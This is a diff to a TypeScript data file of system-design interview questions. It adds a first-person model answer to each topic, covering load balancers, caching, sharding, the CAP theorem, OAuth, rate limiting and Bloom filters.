@@ -11,7 +11,8 @@ export const topics: PvTopic[] = [
       {
         q: 'What is System Design and why does it matter in interviews?',
         difficulty: 'easy',
-        a: `<p><strong>System Design</strong> is the process of defining the architecture, components, and data flow of a large-scale software system. It answers: <em>"How would you build X to handle millions of users?"</em></p>
+        a: `<div class="interview-answer"><p>Honestly, system design is less about knowing the one "right" architecture and more about showing structured thinking under ambiguity. I always start by pinning down requirements and scale — reads vs writes, QPS, data size — before I draw a single box, because the numbers dictate the design. The real signal interviewers want is how I reason about tradeoffs: consistency vs availability, cost vs latency, simplicity vs scale. My anchor is to design for the actual load, not Google-scale when you have a thousand users. The classic trap is reaching for buzzwords like Kafka and sharding before I've justified why.</p></div>
+<p><strong>System Design</strong> is the process of defining the architecture, components, and data flow of a large-scale software system. It answers: <em>"How would you build X to handle millions of users?"</em></p>
 <p><strong>Think of it like building a city:</strong></p>
 <ul>
 <li>You need roads (networks), buildings (servers), water pipes (data flow), traffic lights (load balancers).</li>
@@ -28,7 +29,8 @@ export const topics: PvTopic[] = [
       {
         q: 'What is Horizontal Scaling vs Vertical Scaling?',
         difficulty: 'easy',
-        a: `<p><strong>Vertical Scaling (Scale Up)</strong> = Make one machine more powerful (more CPU, RAM).</p>
+        a: `<div class="interview-answer"><p>Vertical is throwing a bigger box at the problem; horizontal is throwing more boxes. I reach for vertical first because it's dead simple — no distributed-systems tax — and modern hardware goes surprisingly far, but it hits a hard ceiling and leaves you with a single point of failure. Horizontal scales almost without limit and gives you redundancy, but it forces services to be stateless and pushes complexity into load balancing and data consistency. My rule is: scale up until it hurts, then scale out. The real gotcha is that horizontal scaling only works if your app is stateless — local state and sticky sessions are what bite teams.</p></div>
+<p><strong>Vertical Scaling (Scale Up)</strong> = Make one machine more powerful (more CPU, RAM).</p>
 <p><strong>Horizontal Scaling (Scale Out)</strong> = Add more machines to share the work.</p>
 <p><strong>Restaurant analogy:</strong></p>
 <ul>
@@ -47,7 +49,8 @@ Horizontal: 1 server → 10 servers behind a load balancer</pre>
       {
         q: 'What is a Load Balancer and how does it work?',
         difficulty: 'easy',
-        a: `<p>A <strong>Load Balancer</strong> distributes incoming traffic across multiple servers so no single server gets overwhelmed.</p>
+        a: `<div class="interview-answer"><p>A load balancer spreads traffic across servers so no one box gets hammered, and just as importantly it's the health-check gatekeeper that stops routing to dead instances. The decision I care about is L4 vs L7: L4 is fast and dumb (IP and port), while L7 reads the HTTP request so it can route by path or host and terminate TLS. For stateless services round-robin or least-connections is fine; the moment you need sessions, use a shared store like Redis rather than sticky IP-hash. And the classic gotcha is that the balancer itself is a single point of failure, so you run it as an active-passive pair.</p></div>
+<p>A <strong>Load Balancer</strong> distributes incoming traffic across multiple servers so no single server gets overwhelmed.</p>
 <p><strong>Analogy:</strong> Think of a restaurant host who directs customers to different tables/waiters evenly, so no single waiter is overloaded.</p>
 <pre>         Client Requests
                |
@@ -72,7 +75,8 @@ Horizontal: 1 server → 10 servers behind a load balancer</pre>
       {
         q: 'What is Caching and why is it important in system design?',
         difficulty: 'easy',
-        a: `<p><strong>Caching</strong> = storing frequently used data in a fast-access location so you don't have to fetch it from the slow source every time.</p>
+        a: `<div class="interview-answer"><p>Caching trades staleness for speed and load reduction — that's the whole deal. I default to cache-aside with LRU eviction and a bounded TTL because it's simple and only caches what's actually requested. The genuinely hard problem, as the joke goes, is invalidation: keeping the cache in sync when the source changes, or you serve stale data. I always plan for the cache stampede when a hot key expires. And a cache is a performance optimization, not a system of record — the design has to survive the cache being cold or down.</p></div>
+<p><strong>Caching</strong> = storing frequently used data in a fast-access location so you don't have to fetch it from the slow source every time.</p>
 <p><strong>Analogy:</strong> Instead of going to the library every time you need a recipe, you photocopy your favorite recipes and keep them on your fridge (cache). Much faster!</p>
 <pre>Without cache:  User → Server → Database (slow, every time)
 With cache:     User → Server → Cache (fast!) → DB only if not in cache</pre>
@@ -104,7 +108,8 @@ With cache:     User → Server → Cache (fast!) → DB only if not in cache</p
       {
         q: 'What is a CDN (Content Delivery Network)?',
         difficulty: 'easy',
-        a: `<p>A <strong>CDN</strong> is a network of servers distributed around the world that serve static content (images, videos, CSS, JS) from a location <strong>close to the user</strong>.</p>
+        a: `<div class="interview-answer"><p>A CDN pushes static content to edge servers close to users, so you cut latency by geography and offload traffic from your origin. Beyond images and video I use it for anything cacheable, and modern CDNs also give you TLS termination, DDoS absorption, and even edge compute. The knobs that matter are cache-control headers and TTLs, plus a cache-busting strategy like versioned filenames so users aren't stuck with stale assets. The gotcha is accidentally caching something dynamic or user-specific — that's how one user ends up seeing another's data.</p></div>
+<p>A <strong>CDN</strong> is a network of servers distributed around the world that serve static content (images, videos, CSS, JS) from a location <strong>close to the user</strong>.</p>
 <p><strong>Analogy:</strong> Instead of one pizza shop serving the whole city, you open branches in every neighborhood. Customers get pizza faster because the shop is nearby.</p>
 <pre>Without CDN:
   User in Tokyo → Server in New York (200ms latency)
@@ -123,7 +128,8 @@ With CDN:
       {
         q: 'What is a Database Index and how does it speed up queries?',
         difficulty: 'medium',
-        a: `<p>A <strong>database index</strong> is a data structure (usually B-Tree or Hash) that helps the database find rows quickly without scanning every row.</p>
+        a: `<div class="interview-answer"><p>An index is a sorted lookup structure — usually a B-tree — that turns a full table scan into a logarithmic seek. The tradeoff people forget is that indexes aren't free: every write has to maintain them and they cost disk, so I index for actual query patterns, not every column. I think in terms of composite indexes and column order (the leftmost-prefix rule) and covering indexes that answer a query from the index alone. The classic gotcha is a function or type mismatch in the <code>WHERE</code> clause silently disabling the index — always confirm with <code>EXPLAIN</code>.</p></div>
+<p>A <strong>database index</strong> is a data structure (usually B-Tree or Hash) that helps the database find rows quickly without scanning every row.</p>
 <p><strong>Analogy:</strong> Think of the index at the back of a textbook. Instead of reading the entire book to find "Photosynthesis", you look it up in the index, get the page number, and go directly there.</p>
 <pre>Without index: SELECT * FROM users WHERE email = 'john@mail.com'
   → Scans all 10 million rows (slow!)
@@ -142,7 +148,8 @@ With index on email:
       {
         q: 'Explain SQL vs NoSQL databases. When would you choose each?',
         difficulty: 'medium',
-        a: `<p><strong>SQL (Relational)</strong>: Structured tables with rows/columns, enforces schema, uses SQL language. E.g., MySQL, PostgreSQL.</p>
+        a: `<div class="interview-answer"><p>My default is SQL — I want ACID, joins, and a schema until I have a concrete reason not to. I reach for NoSQL when the access pattern is clear and one factor dominates: massive horizontal write scale, a flexible evolving schema, or a specific shape like document, key-value, or graph. The mental shift with NoSQL is that you model around queries up front instead of normalizing, because there are no joins. And it's rarely either/or — polyglot persistence is normal: Postgres for core data, Redis for cache, Elasticsearch for search. The gotcha is picking NoSQL for "scale" you'll never reach and throwing away transactions you actually needed.</p></div>
+<p><strong>SQL (Relational)</strong>: Structured tables with rows/columns, enforces schema, uses SQL language. E.g., MySQL, PostgreSQL.</p>
 <p><strong>NoSQL</strong>: Flexible schema, stores data as documents/key-value/graph/column. E.g., MongoDB, Redis, Cassandra.</p>
 <p><strong>Analogy:</strong></p>
 <ul>
@@ -173,7 +180,8 @@ NoSQL (MongoDB document):
       {
         q: 'What is Database Sharding?',
         difficulty: 'medium',
-        a: `<p><strong>Sharding</strong> = splitting a large database into smaller pieces (shards), each stored on a different server.</p>
+        a: `<div class="interview-answer"><p>Sharding is horizontal partitioning across machines — you split data so each node holds a slice, which lets you scale writes past a single box. The whole game is the shard key: it has to spread load evenly and match your query patterns, or you get hot shards and cross-shard queries that kill you. I avoid sharding as long as I can because it's largely one-way — resharding is painful — so read replicas and caching come first. Range keys are simple but hotspot; hash spreads well but kills range scans; consistent hashing eases rebalancing. The big gotcha is that cross-shard joins and transactions basically disappear.</p></div>
+<p><strong>Sharding</strong> = splitting a large database into smaller pieces (shards), each stored on a different server.</p>
 <p><strong>Analogy:</strong> Imagine a library with 1 million books on one shelf — finding a book is slow. Instead, split books by genre: Fiction in Room A, Science in Room B, History in Room C. Each room is a "shard".</p>
 <pre>Before sharding (1 big DB):
   All 100M users → one database server (bottleneck!)
@@ -193,7 +201,8 @@ After sharding:
       {
         q: 'What is Database Replication?',
         difficulty: 'medium',
-        a: `<p><strong>Replication</strong> = keeping copies of the same database on multiple servers.</p>
+        a: `<div class="interview-answer"><p>Replication keeps copies of your data on multiple nodes, and it buys you two things: read scaling and failover durability. The core choice is synchronous vs asynchronous — sync means no data loss but adds write latency and can stall if a replica lags, while async is fast but you can lose the last few writes on failover. Single-leader is the common default: writes hit the primary, reads fan out to replicas, and the gotcha there is replication lag causing read-your-own-writes bugs. Multi-leader and leaderless exist but bring conflict resolution, which is a real jump in complexity.</p></div>
+<p><strong>Replication</strong> = keeping copies of the same database on multiple servers.</p>
 <p><strong>Analogy:</strong> Instead of one copy of a popular book in the library, keep 5 copies. More people can read it at the same time, and if one copy is damaged, others are still available.</p>
 <pre>Master-Slave Replication:
   [Master DB] ──writes──→  [Slave 1] (read-only copy)
@@ -217,7 +226,8 @@ After sharding:
       {
         q: 'What is the CAP Theorem?',
         difficulty: 'hard',
-        a: `<p>The <strong>CAP Theorem</strong> states that a distributed system can only guarantee <strong>2 out of 3</strong> properties at the same time:</p>
+        a: `<div class="interview-answer"><p>The pop version — pick two of three — is misleading. Partitions aren't something you choose; on a real network they happen, so the actual decision is: when a partition occurs, do you sacrifice consistency or availability? CP means you refuse writes to stay correct (banking, inventory); AP means you keep serving and reconcile later (carts, social feeds). In the happy path with no partition you get both C and A, which is why PACELC extends it — even without partitions you trade latency vs consistency. I always frame it per-operation, because one system can be CP for payments and AP for the feed.</p></div>
+<p>The <strong>CAP Theorem</strong> states that a distributed system can only guarantee <strong>2 out of 3</strong> properties at the same time:</p>
 <ul>
 <li><strong>C</strong>onsistency – Every read gets the most recent write (all nodes see the same data)</li>
 <li><strong>A</strong>vailability – Every request gets a response (even if it might not be the latest data)</li>
@@ -244,7 +254,8 @@ CA systems: Traditional single-node RDBMS (no partition tolerance)
       {
         q: 'What is an API Gateway?',
         difficulty: 'medium',
-        a: `<p>An <strong>API Gateway</strong> is a single entry point that sits between clients and your backend microservices. All requests go through it first.</p>
+        a: `<div class="interview-answer"><p>An API gateway is the single front door to your services, and its job is to centralize the cross-cutting concerns you don't want each service reimplementing: auth, rate limiting, TLS termination, routing, request aggregation, and observability. That keeps services focused on business logic. The tradeoff is another hop and, if you're careless, a single point of failure and a deployment bottleneck — so you run it redundantly and keep business logic out of it. I distinguish it from a plain load balancer: the gateway is L7 and application-aware. The anti-pattern is letting it grow into an ESB with orchestration baked in.</p></div>
+<p>An <strong>API Gateway</strong> is a single entry point that sits between clients and your backend microservices. All requests go through it first.</p>
 <p><strong>Analogy:</strong> Think of a hotel receptionist. Guests don't walk directly to the kitchen, laundry, or housekeeping. They tell the receptionist what they need, and the receptionist routes the request to the right department.</p>
 <pre>Without API Gateway:
   Mobile App → User Service
@@ -271,7 +282,8 @@ With API Gateway:
       {
         q: 'What is a Message Queue and when should you use one?',
         difficulty: 'medium',
-        a: `<p>A <strong>Message Queue</strong> is a system where producers send messages and consumers process them asynchronously. The queue holds messages until they are processed.</p>
+        a: `<div class="interview-answer"><p>A message queue decouples producers from consumers in time — the producer fires and forgets, the consumer processes at its own pace. I use it for three things: smoothing traffic spikes by buffering, doing slow work asynchronously like emails or image processing, and decoupling services so one can be down without dragging others with it. The costs are added latency, eventual consistency, and having to handle duplicate or out-of-order delivery — so consumers must be idempotent. Key decisions are at-least-once vs at-most-once, and a plain queue (SQS, RabbitMQ) vs a log (Kafka) when you need replay. The gotcha everyone hits is needing a dead-letter queue for poison messages.</p></div>
+<p>A <strong>Message Queue</strong> is a system where producers send messages and consumers process them asynchronously. The queue holds messages until they are processed.</p>
 <p><strong>Analogy:</strong> A coffee shop. You (producer) place an order and get a receipt number. You sit down and wait. The barista (consumer) picks orders from the queue and makes coffee one by one. You don't block the line waiting for your coffee.</p>
 <pre>Synchronous (without queue):
   User → Place Order → Wait for email... → Wait for invoice... → Done (slow!)
@@ -305,7 +317,8 @@ Asynchronous (with queue):
       {
         q: 'What is the difference between Monolith and Microservices architecture?',
         difficulty: 'medium',
-        a: `<p><strong>Monolith</strong> = entire application is one big deployable unit.</p>
+        a: `<div class="interview-answer"><p>I almost always start with a monolith — ideally a well-modularized one — because microservices solve organizational and scaling problems you probably don't have yet, and they cost you dearly: network calls, distributed transactions, ops overhead, and debugging across boundaries. Microservices win when you have multiple teams needing independent deploys or components with wildly different scaling profiles. The classic failure mode is splitting too early and ending up with a distributed monolith — all the pain, none of the benefit. My line is: modular monolith first, extract services along real seams once the pain is concrete.</p></div>
+<p><strong>Monolith</strong> = entire application is one big deployable unit.</p>
 <p><strong>Microservices</strong> = application is split into small, independent services, each doing one thing.</p>
 <p><strong>Analogy:</strong></p>
 <ul>
@@ -330,7 +343,8 @@ Microservices:
       {
         q: 'What is Rate Limiting and how do you implement it?',
         difficulty: 'medium',
-        a: `<p><strong>Rate Limiting</strong> = controlling how many requests a user/client can make in a given time window.</p>
+        a: `<div class="interview-answer"><p>Rate limiting protects you from abuse, runaway clients, and cost blowups, and it enforces basic fairness between tenants. Algorithm-wise I default to token bucket because it allows bursts while capping the average rate; sliding window is more precise but heavier; fixed window is simplest but has the boundary-spike problem. In a distributed setup the real challenge is shared state, so you centralize counters in Redis with atomic operations and accept a little accuracy loss. I always return <code>429</code> with a <code>Retry-After</code> header so clients back off gracefully. The gotcha is keying it wrong — per-IP breaks behind NAT and proxies, so key per API key or user where you can.</p></div>
+<p><strong>Rate Limiting</strong> = controlling how many requests a user/client can make in a given time window.</p>
 <p><strong>Analogy:</strong> A theme park ride allows only 20 people per 5 minutes. If more people come, they wait in line. This prevents overcrowding (server overload).</p>
 <p><strong>Common algorithms:</strong></p>
 <ul>
@@ -353,7 +367,8 @@ Microservices:
       {
         q: 'What is Consistent Hashing and why is it used?',
         difficulty: 'hard',
-        a: `<p><strong>Consistent Hashing</strong> is a technique for distributing data across servers such that when a server is added or removed, only a minimal amount of data needs to move.</p>
+        a: `<div class="interview-answer"><p>Consistent hashing solves the resharding nightmare: with plain <code>hash(key) % N</code>, changing N remaps almost every key. Consistent hashing places nodes and keys on a ring, so adding or removing a node only moves the keys near it — about 1/N of the data — instead of everything. The refinement that makes it actually work is virtual nodes: each physical node gets many points on the ring so load stays even and you avoid hotspots. It's the backbone of Dynamo, Cassandra, and distributed caches. The gotcha it doesn't solve on its own is uneven load from hot keys, which still needs replication or bounded loads.</p></div>
+<p><strong>Consistent Hashing</strong> is a technique for distributing data across servers such that when a server is added or removed, only a minimal amount of data needs to move.</p>
 <p><strong>Problem with simple hashing:</strong></p>
 <pre>server = hash(key) % N   (N = number of servers)
 If N changes (add/remove server), ALMOST ALL keys get remapped! 💀</pre>
@@ -376,7 +391,8 @@ If Server B is removed → key goes to Server C (minimal disruption)</pre>
       {
         q: 'How would you design a URL Shortener (like bit.ly)?',
         difficulty: 'medium',
-        a: `<p>A URL shortener converts long URLs to short ones (e.g., <code>bit.ly/abc123</code>) and redirects users to the original URL.</p>
+        a: `<div class="interview-answer"><p>This one is really a distributed-ID and read-heavy key-value problem in disguise. The core is generating a short unique key — I'd base62-encode a counter (or hand each node a pre-allocated key range) rather than hashing the URL, since hashing invites collisions. It's overwhelmingly read-heavy, so the design is a simple KV store for the mapping plus aggressive caching and a CDN in front of the redirect. I'd choose <code>301</code> vs <code>302</code> deliberately — 302 if I want click analytics. The real gotchas are custom aliases, expiration, and keeping key generation collision-free without a central bottleneck.</p></div>
+<p>A URL shortener converts long URLs to short ones (e.g., <code>bit.ly/abc123</code>) and redirects users to the original URL.</p>
 <p><strong>Step-by-step design:</strong></p>
 <p><strong>1. Core flow:</strong></p>
 <pre>Create:  POST /shorten { url: "https://very-long-url.com/..." }
@@ -406,7 +422,8 @@ ID: 999999999 → Base62: "15FTGf"</pre>
       {
         q: 'How would you design a Chat System (like WhatsApp/Slack)?',
         difficulty: 'hard',
-        a: `<p>A real-time chat system requires instant message delivery, presence (online/offline), and message persistence.</p>
+        a: `<div class="interview-answer"><p>The heart of chat is a persistent connection — WebSockets — so the server can push messages instead of clients polling. The tricky part is that users connect to different servers, so you need to route a message to whichever server holds the recipient's connection: a pub/sub layer (Redis or Kafka) plus a session registry mapping user to server. Messages are persisted for history and offline delivery in a write-heavy store partitioned by conversation. I'd design delivery and read receipts with acks and handle presence via heartbeats. The gotchas are per-conversation ordering, fan-out for large group chats, and reconnection backfill after a drop.</p></div>
+<p>A real-time chat system requires instant message delivery, presence (online/offline), and message persistence.</p>
 <p><strong>Key components:</strong></p>
 <pre>Architecture:
   [Client] ←WebSocket→ [Chat Server] → [Message Queue] → [Chat Server] ←WebSocket→ [Client]
@@ -439,7 +456,8 @@ Status: sent → delivered → read</pre>
       {
         q: 'What is a Reverse Proxy?',
         difficulty: 'easy',
-        a: `<p>A <strong>Reverse Proxy</strong> sits between clients and servers, forwarding client requests to the appropriate backend server.</p>
+        a: `<div class="interview-answer"><p>A reverse proxy fronts your servers to the world — clients talk to it, and it forwards to the backend. It's the natural home for TLS termination, caching, compression, and hiding your topology. People conflate it with a load balancer, but they're different jobs that often share a tool like Nginx: a load balancer distributes across identical servers, whereas a reverse proxy is about being the intermediary — a forward proxy protects clients, a reverse proxy protects and abstracts servers. The gotcha is forgetting to forward the real client IP via <code>X-Forwarded-For</code>, which breaks logging and rate limiting downstream.</p></div>
+<p>A <strong>Reverse Proxy</strong> sits between clients and servers, forwarding client requests to the appropriate backend server.</p>
 <p><strong>Analogy:</strong> You call a company's main phone number (reverse proxy). The receptionist answers and transfers you to the right department (backend server). You never dial the department directly.</p>
 <pre>Forward Proxy (protects clients):
   [Client] → [Proxy] → [Internet/Servers]
@@ -462,7 +480,8 @@ Reverse Proxy (protects servers):
       {
         q: 'What are WebSockets vs HTTP Long Polling vs Server-Sent Events?',
         difficulty: 'medium',
-        a: `<p>These are three ways for a server to push data to clients in real-time:</p>
+        a: `<div class="interview-answer"><p>These trade off duplex capability, complexity, and infrastructure fit. Long polling is the fallback — the client requests and the server holds until there's data or a timeout — works everywhere but is wasteful. SSE is a one-way server-to-client stream over plain HTTP that auto-reconnects and is dead simple, perfect for feeds, notifications, and live scores. WebSockets are full-duplex over a single upgraded connection, the right call when the client also pushes frequently — chat, gaming, collaborative editing. My default is SSE when the flow is mostly server-to-client, upgrading to WebSockets only when I truly need bidirectional. The gotcha is that persistent connections don't love load balancers and proxies, so plan for sticky routing and connection limits.</p></div>
+<p>These are three ways for a server to push data to clients in real-time:</p>
 <p><strong>1. HTTP Long Polling:</strong></p>
 <pre>Client: "Any new data?" → Server holds connection open...
    ...waits until there IS new data...
@@ -489,7 +508,8 @@ Initial HTTP handshake → upgraded to WebSocket</pre>
       {
         q: 'What is the difference between REST and GraphQL?',
         difficulty: 'medium',
-        a: `<p><strong>REST</strong>: Multiple endpoints, each returns a fixed data shape. <strong>GraphQL</strong>: One endpoint, client specifies exactly what data it wants.</p>
+        a: `<div class="interview-answer"><p>REST is resource-oriented with fixed endpoints; GraphQL is one endpoint where the client asks for exactly the fields it wants. GraphQL shines with many clients that have different data needs — especially mobile — killing over-fetching and the need for bespoke endpoints. But it moves complexity to the server: you now own query depth and cost limiting, HTTP caching mostly disappears, and the classic N+1 resolver problem needs DataLoader batching. My default is still REST for simple CRUD and public APIs, and GraphQL when the client-side aggregation pain is real. gRPC is the third option I'd raise for internal service-to-service calls.</p></div>
+<p><strong>REST</strong>: Multiple endpoints, each returns a fixed data shape. <strong>GraphQL</strong>: One endpoint, client specifies exactly what data it wants.</p>
 <p><strong>Analogy:</strong></p>
 <ul>
 <li><strong>REST</strong> = A restaurant with a fixed menu. You order "Combo #3" and get whatever's in it — even if you don't want the salad.</li>
@@ -520,7 +540,8 @@ GraphQL:
       {
         q: 'What are ACID properties in databases?',
         difficulty: 'medium',
-        a: `<p><strong>ACID</strong> ensures database transactions are reliable:</p>
+        a: `<div class="interview-answer"><p>ACID is the guarantee that a transaction is all-or-nothing and leaves the database in a valid state. The property people underestimate is Isolation — it's not binary but a spectrum of levels (read committed, repeatable read, serializable), each allowing different anomalies like dirty reads, non-repeatable reads, and phantoms. Most databases default to read committed, not serializable, so you have to know which anomalies your code tolerates. Durability usually means a write-ahead log flushed to disk. The senior framing is that ACID is exactly what you give up — or carefully rebuild with sagas — the moment you go distributed.</p></div>
+<p><strong>ACID</strong> ensures database transactions are reliable:</p>
 <ul>
 <li><strong>A</strong>tomicity – All or nothing. If any part fails, the whole transaction rolls back.</li>
 <li><strong>C</strong>onsistency – Data goes from one valid state to another. Rules (constraints) are never broken.</li>
@@ -548,7 +569,8 @@ Durability:  After "Transfer complete", even if server crashes, the transfer is 
       {
         q: 'What is Eventual Consistency?',
         difficulty: 'medium',
-        a: `<p><strong>Eventual Consistency</strong> = after a write, all replicas will <em>eventually</em> return the latest value, but not immediately.</p>
+        a: `<div class="interview-answer"><p>Eventual consistency means that if writes stop, all replicas converge to the same value — but for a window, different readers can see different data. It's the deliberate price you pay for availability and low latency at scale, i.e. AP systems. The key judgment is that it's fine for a huge class of problems — likes, follower counts, feeds — and unacceptable for things like account balances. The developer-facing gotcha is read-your-own-writes: a user updates their profile, doesn't see the change, and it looks like a bug. You paper over that with session consistency, reading from the leader for that user, or optimistic UI updates.</p></div>
+<p><strong>Eventual Consistency</strong> = after a write, all replicas will <em>eventually</em> return the latest value, but not immediately.</p>
 <p><strong>Strict Consistency</strong> = after a write, ALL reads immediately see the new value.</p>
 <p><strong>Analogy:</strong> You update your profile picture on social media.</p>
 <ul>
@@ -573,7 +595,8 @@ Durability:  After "Transfer complete", even if server crashes, the transfer is 
       {
         q: 'How would you design a News Feed system (like Facebook/Twitter)?',
         difficulty: 'hard',
-        a: `<p>A news feed shows a personalized list of posts from people you follow, ranked and ordered.</p>
+        a: `<div class="interview-answer"><p>The whole design hinges on fan-out on write vs fan-out on read. Fan-out on write (push) precomputes each user's feed when someone posts — fast reads, but a celebrity with millions of followers triggers a write storm. Fan-out on read (pull) assembles the feed at read time from the people you follow — cheap writes, expensive reads. The real answer at scale is hybrid: push for normal users, pull for celebrities, merge at read time. Feeds live in a cache like Redis, ranked, and paginated by cursor rather than offset. The gotchas are the celebrity problem, ranking, and keeping the precomputed feed from going stale.</p></div>
+<p>A news feed shows a personalized list of posts from people you follow, ranked and ordered.</p>
 <p><strong>Two main approaches:</strong></p>
 <p><strong>1. Fan-out on Write (Push model):</strong></p>
 <pre>User A creates a post
@@ -607,7 +630,8 @@ Feed cache per user:
       {
         q: 'What is a Circuit Breaker pattern?',
         difficulty: 'medium',
-        a: `<p>A <strong>Circuit Breaker</strong> prevents your service from repeatedly calling a failing service. It "trips" after too many failures and returns errors immediately.</p>
+        a: `<div class="interview-answer"><p>A circuit breaker stops you from hammering a service that's already failing — it fails fast instead of piling up timeouts, which is what prevents a cascading failure across the whole system. It works like an electrical breaker with three states: closed (normal), open (tripped after a failure threshold, reject immediately), and half-open (let a few probes through to test recovery). The value is protecting the caller's threads while giving the downstream room to recover. I pair it with timeouts, retries with backoff, and a fallback. The gotcha is tuning the thresholds — too sensitive and you trip on blips, too loose and it never actually protects you.</p></div>
+<p>A <strong>Circuit Breaker</strong> prevents your service from repeatedly calling a failing service. It "trips" after too many failures and returns errors immediately.</p>
 <p><strong>Analogy:</strong> Electrical circuit breaker in your house. If there's a short circuit, the breaker trips and cuts power to prevent a fire. After fixing the issue, you flip it back on.</p>
 <pre>States:
   [CLOSED] → Requests pass through normally
@@ -637,7 +661,8 @@ Order Service → Circuit Breaker → Payment Service (down!)
       {
         q: 'What is Event-Driven Architecture?',
         difficulty: 'medium',
-        a: `<p><strong>Event-Driven Architecture (EDA)</strong> = services communicate by producing and consuming events instead of directly calling each other.</p>
+        a: `<div class="interview-answer"><p>In EDA services emit events about what happened and others react, instead of calling each other directly — that inverts the dependency and gives you loose coupling and easy extensibility, since you can add a consumer without touching the producer. It's ideal for async workflows and scaling teams independently. The costs are real: eventual consistency, no easy end-to-end view (you lean on distributed tracing), harder debugging, and you must design for duplicate and out-of-order events. I distinguish event notification from event-carried state transfer from full event sourcing — very different commitments. The gotcha is hidden coupling through event schemas, so a schema registry and versioning matter.</p></div>
+<p><strong>Event-Driven Architecture (EDA)</strong> = services communicate by producing and consuming events instead of directly calling each other.</p>
 <p><strong>Analogy:</strong> Instead of Person A calling Person B directly (phone call = synchronous), Person A posts a note on a bulletin board (event), and anyone interested reads it (asynchronous).</p>
 <pre>Traditional (synchronous):
   Order Service → calls → Payment Service → calls → Inventory Service
@@ -668,7 +693,8 @@ Event-Driven (asynchronous):
       {
         q: 'What is the difference between Authentication and Authorization?',
         difficulty: 'easy',
-        a: `<p><strong>Authentication (AuthN)</strong> = "Who are you?" → Verifying identity (login).</p>
+        a: `<div class="interview-answer"><p>Authentication is proving who you are; authorization is deciding what you're allowed to do — identity first, then permissions. They're separate stages and I keep them separate in code: authenticate once at the edge, then check authorization at every resource access, close to the data. The classic security failure is authenticating a user and then trusting client-supplied identity or role claims for authorization — that's how you get IDOR and privilege escalation. So authorization checks always run server-side against the authenticated principal, never based on what the client asserts about itself.</p></div>
+<p><strong>Authentication (AuthN)</strong> = "Who are you?" → Verifying identity (login).</p>
 <p><strong>Authorization (AuthZ)</strong> = "What can you do?" → Verifying permissions.</p>
 <p><strong>Analogy:</strong></p>
 <ul>
@@ -699,7 +725,8 @@ if (user.role === "viewer") → allow GET /posts only</pre>
       {
         q: 'What is OAuth 2.0 and how does it work?',
         difficulty: 'hard',
-        a: `<p><strong>OAuth 2.0</strong> is an authorization framework that lets a third-party app access your data without giving it your password.</p>
+        a: `<div class="interview-answer"><p>OAuth 2.0 is a delegated authorization framework — its whole point is letting an app act on your behalf without ever seeing your password, via scoped, revocable tokens. The flow I default to is Authorization Code with PKCE, because it keeps the token exchange protected and never exposes secrets to the browser. The big conceptual clarification is that OAuth is about authorization, not authentication — logging people in is what OpenID Connect layers on top. The common mistake is using the deprecated implicit flow, or treating the access token as proof of identity, which it isn't.</p></div>
+<p><strong>OAuth 2.0</strong> is an authorization framework that lets a third-party app access your data without giving it your password.</p>
 <p><strong>Analogy:</strong> You want a house cleaner (App) to enter your house (Google account). Instead of giving them your house key (password), you give them a temporary access card (token) that only opens the front door (limited access) and expires after 2 hours.</p>
 <pre>OAuth 2.0 Flow (Authorization Code):
 
@@ -728,7 +755,8 @@ if (user.role === "viewer") → allow GET /posts only</pre>
       {
         q: 'How would you design a Notification System?',
         difficulty: 'hard',
-        a: `<p>A notification system sends messages to users through multiple channels: push notifications, SMS, email, and in-app.</p>
+        a: `<div class="interview-answer"><p>I'd design this as an event-driven pipeline with a queue at its core: services emit notification events, and workers fan them out to channel-specific senders — push, SMS, email, in-app — each behind its own provider adapter. The features that separate a real design from a toy are user preferences and opt-outs, deduplication and idempotency so a retry doesn't double-send, per-user rate limiting, and templating with localization. Third-party providers fail and throttle, so retries with backoff, dead-letter queues, and fallbacks are essential. The gotchas are prioritization — an OTP can't wait behind a marketing blast — and delivery tracking across channels.</p></div>
+<p>A notification system sends messages to users through multiple channels: push notifications, SMS, email, and in-app.</p>
 <pre>Architecture:
   [Any Service] → "SendNotification" event → [Notification Service]
                                                     ↓
@@ -762,7 +790,8 @@ if (user.role === "viewer") → allow GET /posts only</pre>
       {
         q: 'What is the Single Point of Failure (SPOF) and how do you eliminate it?',
         difficulty: 'easy',
-        a: `<p>A <strong>Single Point of Failure (SPOF)</strong> is any component whose failure would bring down the entire system.</p>
+        a: `<div class="interview-answer"><p>A SPOF is any component whose failure takes the whole system down, and the goal of high-availability design is to hunt these down and add redundancy. You eliminate them by removing state and adding replicas: multiple app servers behind a balancer, a redundant balancer, a database with replicas and automatic failover, multi-AZ deployment. The subtle part is that redundancy isn't automatic resilience — you need health checks and automated failover, and you should actually test it (chaos engineering), because untested failover usually doesn't work. And watch for hidden SPOFs: a shared config service, DNS, a single message broker, or the deploy pipeline itself.</p></div>
+<p>A <strong>Single Point of Failure (SPOF)</strong> is any component whose failure would bring down the entire system.</p>
 <p><strong>Analogy:</strong> A chain is only as strong as its weakest link. If your system has one database server and it crashes, everything goes down — that's a SPOF.</p>
 <pre>SPOF Examples:
   ❌ One database server → crashes → entire app is down
@@ -787,7 +816,8 @@ Eliminating SPOFs:
       {
         q: 'How would you design a Rate Limiter service?',
         difficulty: 'hard',
-        a: `<p>A rate limiter service controls request traffic to protect backend services from overload and abuse.</p>
+        a: `<div class="interview-answer"><p>As a standalone service the extra concerns beyond the algorithm are where the counters live, the latency budget, and the failure mode. I'd centralize state in Redis with atomic Lua scripts so the token-bucket check is one round-trip and race-free. Token bucket is my default because it allows bursts while capping the average; sliding-window-log is more accurate at the cost of memory. The two decisions people miss: fail-open vs fail-closed when Redis is down — usually fail-open, since you don't want the limiter itself to cause the outage — and running the check as close to the edge as possible. Keying correctly and returning <code>429</code> with <code>Retry-After</code> rounds it out.</p></div>
+<p>A rate limiter service controls request traffic to protect backend services from overload and abuse.</p>
 <p><strong>Design requirements:</strong></p>
 <ul>
 <li>Low latency (must not slow down requests)</li>
@@ -835,7 +865,8 @@ HTTP 429 Too Many Requests (when limit exceeded)</pre>
       {
         q: 'What is a Bloom Filter and when would you use it?',
         difficulty: 'hard',
-        a: `<p>A <strong>Bloom Filter</strong> is a space-efficient data structure that tells you:</p>
+        a: `<div class="interview-answer"><p>A Bloom filter is a probabilistic set-membership test that trades a little accuracy for huge space savings: it answers "definitely not present" or "probably present" — false positives happen, false negatives never. That asymmetry is the whole value: use it as a cheap in-memory gate before an expensive lookup. The canonical use is avoiding disk hits for keys that don't exist — Cassandra and Bigtable keep one per SSTable, and it's the standard defense against cache-penetration attacks. The tradeoffs are that you can't delete (you'd need a counting variant) and you tune the false-positive rate via the bit-array size and number of hash functions.</p></div>
